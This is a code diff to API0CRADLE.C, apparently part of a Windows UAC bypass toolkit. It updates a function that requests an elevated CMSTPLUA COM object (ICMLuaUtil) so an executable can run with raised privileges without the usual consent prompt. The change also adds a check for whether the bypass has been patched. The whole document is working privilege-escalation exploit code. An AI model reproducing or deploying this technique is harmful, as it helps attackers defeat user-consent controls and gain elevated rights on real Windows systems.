@@ -4,9 +4,9 @@
 *
 *  TITLE:       API0CRADLE.C
 *
-*  VERSION:     2.90
+*  VERSION:     3.00
 *
-*  DATE:        10 July 2018
+*  DATE:        25 Aug 2018
 *
 *  UAC bypass method from Oddvar Moe aka api0cradle.
 *
@@ -31,31 +31,34 @@ BOOL ucmCMLuaUtilShellExecMethod(
     _In_ LPWSTR lpszExecutable
 )
 {
-    HRESULT          r = E_FAIL;
-    BOOL             bCond = FALSE;
-    IID              xIID_ICMLuaUtil;
+    HRESULT          r = E_FAIL, hr_init;
+    BOOL             bCond = FALSE, bApprove = FALSE;
     ICMLuaUtil      *CMLuaUtil = NULL;
+
+    hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
 
     do {
 
-        if (lpszExecutable == NULL)
-            break;
-
-        if (IIDFromString(T_IID_ICMLuaUtil, &xIID_ICMLuaUtil) != S_OK) {
-            break;
+        //
+        // Potential fix check.
+        //
+        if (supIsConsentApprovedInterface(T_CLSID_CMSTPLUA, &bApprove)) {
+            if (bApprove == FALSE)
+                if (ucmShowQuestion(UACFIX) != IDYES)
+                    break;
         }
 
-        r = ucmMasqueradedCoGetObjectElevate(
+        r = ucmAllocateElevatedObject(
             T_CLSID_CMSTPLUA,
+            &IID_ICMLuaUtil,
             CLSCTX_LOCAL_SERVER,
-            &xIID_ICMLuaUtil,
             &CMLuaUtil);
 
         if (r != S_OK)
             break;
 
         if (CMLuaUtil == NULL) {
-            r = E_FAIL;
+            r = E_OUTOFMEMORY;
             break;
         }
 
@@ -71,6 +74,9 @@ BOOL ucmCMLuaUtilShellExecMethod(
     if (CMLuaUtil != NULL) {
         CMLuaUtil->lpVtbl->Release(CMLuaUtil);
     }
+
+    if (hr_init == S_OK)
+        CoUninitialize();
 
     return SUCCEEDED(r);
 }
